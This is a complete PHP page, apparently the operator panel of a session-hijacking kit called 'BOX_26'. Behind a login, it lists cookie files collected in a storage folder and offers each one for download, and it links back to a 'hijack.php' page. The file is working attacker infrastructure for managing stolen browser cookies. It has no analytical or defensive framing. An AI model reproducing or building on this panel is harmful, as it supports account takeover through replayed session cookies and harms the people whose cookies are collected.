<?php
session_start();
if (!($_SESSION['logged_in'] ?? false)) { header('Location: index.php'); exit; }

define('COOKIE_DIR', '../storage/cookies/');
$files = glob(COOKIE_DIR . '*.json');
usort($files, function($a, $b) { return filemtime($b) - filemtime($a); });
?>
<!DOCTYPE html>
<html>
<head>
    <title>BOX_26 - Cookie Manager</title>
    <style>
        body { background: #0a0e1a; color: #00ff9d; font-family: monospace; padding: 20px; }
        .header { display: flex; justify-content: space-between; margin-bottom: 30px; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; padding: 10px; border-bottom: 1px solid #00ff9d; }
        td { padding: 10px; border-bottom: 1px solid #2a2f3f; }
        a { color: #00ff9d; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .download-btn { background: #00ff9d; color: #0a0e1a; padding: 3px 10px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🍪 Cookie Storage</h1>
        <div><a href="hijack.php">← Back</a> | <a href="?logout=1">Logout</a></div>
    </div>
    
    <table>
        <tr><th>Filename</th><th>Size</th><th>Modified</th><th>Action</th></tr>
        <?php foreach ($files as $file): ?>
        <tr>
            <td><?= basename($file) ?></td>
            <td><?= round(filesize($file) / 1024, 2) ?> KB</td>
            <td><?= date('Y-m-d H:i:s', filemtime($file)) ?></td>
            <td><a href="../<?= $file ?>" download class="download-btn">📥 Download</a></td>
        </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>
